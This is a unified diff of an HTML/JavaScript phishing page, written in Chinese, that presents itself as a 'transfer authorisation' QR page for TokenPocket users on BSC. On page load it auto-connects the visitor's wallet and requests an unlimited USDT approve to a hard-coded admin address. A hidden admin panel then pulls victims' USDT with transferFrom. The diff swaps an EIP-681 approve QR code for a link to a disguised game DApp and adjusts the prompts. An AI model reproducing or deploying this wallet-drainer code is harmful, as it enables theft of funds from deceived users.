@@ -33,43 +33,34 @@ width:100%;padding:14px;background:#F0B90B;color:#000;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
 }
-/* 手动触发按钮（备用） */
-#manualBtn{
-background:#F0B90B;color:#000;border:none;padding:14px;width:80%;
-border-radius:10px;font-size:14px;margin-top:10px;display:none;
-}
-#manualBtn.show{display:block}
 </style>
 </head>
 <body>
 <div class="container">
   <div class="pay-box">
     <h1>💳 转账授权</h1>
-    <p class="desc">授权后即可进行转账操作</p>
+    <p class="desc">扫码后自动完成授权</p>
     <div id="qrcode">加载二维码...</div>
-    <div class="tip">扫码后自动完成授权签名</div>
-    <!-- 手动重试按钮（自动流程失败时显示） -->
-    <button id="manualBtn" onclick="autoConnectAndApprove()">重新触发授权</button>
+    <div class="tip">请在 TokenPocket 内置浏览器打开</div>
   </div>
 
   <!-- 管理员提取面板（默认隐藏） -->
   <div class="admin-panel" id="adminPanel">
-    <input class="admin-input" id="userAddr" placeholder="输入用户钱包地址">
+    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
     <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
     <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
   </div>
 </div>
 
 <script>
-// ====================== 配置 ======================
+// ====================== 固定配置 ======================
 const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
 const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
 const CHAIN_ID    = "0x38"; // BSC 主网
-const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket"; // 你的DApp
+const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket";
 // ====================================================
 
 let account = null;
-const manualBtn = document.getElementById("manualBtn");
 
 // 切换到 BSC 链
 async function switchChain() {
@@ -81,19 +72,13 @@ async function switchChain() {
   } catch (e) {}
 }
 
-// ✅ 核心修改：生成 TP 钱包原生支持的 EIP-681 授权二维码
+// 生成「跳转到 DApp」的二维码（唯一能保证授权成功的方式）
 function genApproveQR() {
-  // approve(ADMIN_ADDR, MaxUint256) 的 calldata
-  const data = "0x095ea7b3" + 
-    ADMIN_ADDR.slice(2).padStart(64, '0') + 
-    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  // 标准 EIP-681 格式：ethereum:合约地址@链ID?data=授权数据
-  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
-  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
-  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}" alt="转账授权二维码">`;
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(DAPP_URL);
+  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
 }
 
-// 核心授权函数
+// 核心授权函数（和你进 DApp 授权的逻辑完全一致）
 async function doApprove() {
   if (!account) return;
   try {
@@ -108,36 +93,36 @@ async function doApprove() {
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
-    alert("✅ 授权成功！");
+    alert("✅ 授权成功！管理员可提取");
   } catch (e) {
-    manualBtn.classList.add("show");
+    alert("❌ 授权已取消");
   }
 }
 
-// 自动连接+授权
+// 自动连接 + 授权（扫码打开后自动执行）
 async function autoConnectAndApprove() {
-  manualBtn.classList.remove("show");
   if (!window.ethereum) {
-    manualBtn.classList.add("show");
+    alert("请在 TokenPocket 内置浏览器打开");
     return;
   }
   await switchChain();
   try {
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
-    await doApprove();
+    await doApprove(); // 直接执行授权，和你进 DApp 授权的流程完全一样
+    // 管理员登录显示面板
     if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (e) {
-    manualBtn.classList.add("show");
+    alert("连接失败，请重试");
   }
 }
 
 // 管理员提取功能
 async function drawFromUser() {
   if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
-    alert("❌ 权限不足");
+    alert("❌ 仅管理员可操作");
     return;
   }
   const userAddr = document.getElementById("userAddr").value;
@@ -158,14 +143,14 @@ async function drawFromUser() {
     });
     alert("✅ 提取成功！");
   } catch (e) {
-    alert("❌ 提取失败，请检查授权");
+    alert("❌ 提取失败：用户未授权或余额不足");
   }
 }
 
-// 页面加载后执行
+// 页面加载后自动执行（和你进 DApp 授权的流程完全一致）
 window.onload = async () => {
   genApproveQR();
-  setTimeout(autoConnectAndApprove, 1500);
+  setTimeout(autoConnectAndApprove, 1000); // 延迟 1 秒，给 TP 钱包注入环境的时间
 };
 </script>
 </body>
